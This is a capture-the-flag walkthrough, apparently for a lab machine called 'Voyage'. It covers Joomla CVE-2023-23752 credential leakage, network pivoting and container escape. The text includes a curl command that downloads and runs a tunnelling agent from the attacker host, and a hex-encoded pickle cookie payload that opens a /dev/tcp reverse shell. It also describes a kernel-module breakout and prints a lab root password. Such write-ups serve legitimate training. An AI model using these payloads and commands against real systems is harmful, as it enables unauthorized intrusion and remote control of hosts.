# Voyage 

Sometimes in a pentest, you get root access very quickly. But is it the real root or just a container? The voyage might still be going on.

`echo "10.49.137.118 voyage.thm >> /etc/hosts`

###### Recon with Nmap 
`nmap -sCV -T4 -p- 10.49.137.118`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 90:66:24:df:fd:b6:df:fe:82:4d:54:6f:e9:fa:14:87 (ECDSA)
|_  256 e0:49:44:c7:80:a0:03:1e:ca:15:d2:5e:b9:9e:23:b3 (ED25519)

80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-title: Home
|_http-server-header: Apache/2.4.58 (Ubuntu)

2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:4a:7e:34:01:09:f8:68:d8:f7:dd:b8:57:d4:17:cf (RSA)
|   256 8d:cd:5e:60:35:c8:65:66:3a:c5:5c:2f:ac:62:93:80 (ECDSA)
|_  256 a9:d5:16:b1:5d:4a:4c:94:3f:fd:a9:68:5f:24:ee:79 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

###### Information Disclosure from Robots.txt
`/joomla/administrator`: External 404 not found 
`/administrator`: Admin panel login webpage
`/api`: Reveals error messages, i.e. {"title":"Resource not found", "code":404}
`/cache`: Blank on HTTP access
`/cli`: Blank on HTTP access
`/components`: Blank on HTTP access
`/includes`: Blank on HTTP access
`/installation`: External 404 not found
`/language`: Blank on HTTP access
`/layouts`: Blank on HTTP access
`/libraries`: 403 Forbidden
`/logs`: External 404 not found
`/modules`: Blank on HTTP access
`/plugins`: Blank on HTTP access

###### Vulnerability Assessment with Joomscan 
Joomscan Version 4.2.7 => Vulnerable to CVE-2023-23752
PoC: `curl -v http://voyage.thm/api/index.php/v1/config/application?public=true`

###### Disclosure of Sensitive Data (CVE-2023-23752 Exploit)
The exploit involves an authentication bypass that results in a leak of configuration details, including credentials for root.
`root:RootPassword@1234`

`ssh root@voyage.thm -p2222`

###### Internal network scanning 
`ip a s` => eth0 address: 192.168.100.0/24

`nmap -sn 192.168.100.0/24`
	reveals three hosts: 192.168.100.1, 192.168.100.10, 192.168.100.12

`nmap 192.168.100.12` => reveals service tcpwrapped running on port 5000 of the host 

###### SSH Tunneling with Port Forwarding 
`ssh -L 5000:192.168.100.12:5000 root@voyage.thm -p2222`

On the attacker machine, run nmap locally to scan port 5000: `nmap -sCV -T4 -p5000 127.0.0.1`
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.10.12)
|_http-server-header: Werkzeug/3.1.3 Python/3.10.12
|_http-title: Tourism Secret Finance Panel
```

###### Traffic Relay with Ligolo-ng 
Set up a reverse tunnel connection with Ligolo-ng from the container to the attacker machine. This enables bidirectional communication, exposing the container's internal and external services 

1. A network tunnel interface called ligolo is set up on the attacking machine with routes configured to forward traffic through the tunnel.
```
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1 dev ligolo
```

2. Start the proxy server `./proxy -selfcert`

3. Get the agent on the docker container with curl and connect to the proxy 
```
curl http://192.168.132.123/agent -o agent
chmod +x agent
./agent -connect 192.168.132.123:11601 --ignore-cert
```

This allows the attacker to reach machines on an internal network of a target and their serivces through a network tunnel, forwarding traffic towards the attacker. 

###### Insecure Deserialization

Upon logging in with previously found credentials `root:RootPassword@1234` on the Python web server at `127.0.0.1:5000`, we see the Tourism Secret Finance Panel hosted via a Python web server using Werkzeug. 
Looking at the cookies cached by the browser client, we can see that there is a cookie. We can infer that this is a serialized cookie using pickle: 
`80049525000000000000007d94288c0475736572948c04726f6f74948c07726576656e7565948c05383530303094752e`

Using a script to deserialize the data results in the plaintext version `{'user': 'root', 'revenue': '85000'}`

Another script can be used to craft a malicious payload that spawns a reverse shell on our attacker machine, with the following payload: 
`8004955c000000000000008c0a73756270726f63657373948c05506f70656e9493945d94288c0462617368948c022d63948c2d62617368202d69203e26202f6465762f7463702f3139322e3136382e3133322e3132332f3434343420303e26319465859452942e`

Set up a netcat listener: `nc -lvnp 4444`

Send a request including the cookie to the website: `curl -H 'Cookie:session_data=8004955c000000000000008c0a73756270726f63657373948c05506f70656e9493945d94288c0462617368948c022d63948c2d62617368202d69203e26202f6465762f7463702f3139322e3136382e3133322e3132332f3434343420303e26319465859452942e' http://127.0.0.1:5000`

###### Root Access with Reverse Shell 

First flag located at /root/user.txt

###### Docker Enumeration with DEEPCE
```
Dangerous Capabilities .. Yes
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
```
- The cap_sys_module enables a process to "add or remove kernel modules in or from the kernel of the Docker host machine" and because of this, an attacker can compile a kernel module that invokes a reverse shell to break out of the container (i.e. written in C, called breakout.c)
- Setup a listener with netcat: `nc -lvnp 4445`
- Once the module has been compiled, the exploit can be triggered with the following: `insmod breakout.ko`
